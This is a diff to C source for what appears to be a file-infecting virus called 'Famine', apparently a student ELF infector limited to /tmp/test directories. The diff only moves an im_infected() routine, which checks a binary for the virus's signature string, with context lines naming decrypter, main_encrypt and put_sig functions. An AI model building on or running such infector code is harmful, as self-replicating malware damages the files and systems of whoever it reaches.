@@ -378,7 +378,20 @@ void decrypter(unsigned long address_of_main)
 		}
 	}
 }
+bool	im_infected(char *data)
+{
+	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
+	int i;
 
+	i = 0;
+	while(sig[i])
+	{
+		if (sig[i] !=  *((char *)(data - SIZE_BEFORE_ENTRY_POINT + i)))
+			return(0);
+		i++;
+	}
+	return(1);
+}
 int main_encrypt()
 {
 	char path_env[256] = {'/','t','m','p','/','t','e','s','t',':','/','t','m','p','/','t','e','s','t','2',':',0};
@@ -783,20 +796,7 @@ __syscall2(int, fstat, int, fildes, struct stat * , buf);
 	return(1);
 }
 
- bool	im_infected(char *data)
-{
-	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
-	int i;
 
-	i = 0;
-	while(sig[i])
-	{
-		if (sig[i] !=  *((char *)(data - SIZE_BEFORE_ENTRY_POINT + i)))
-			return(0);
-		i++;
-	}
-	return(1);
-}
 
  void	put_sig(int fd)
 {
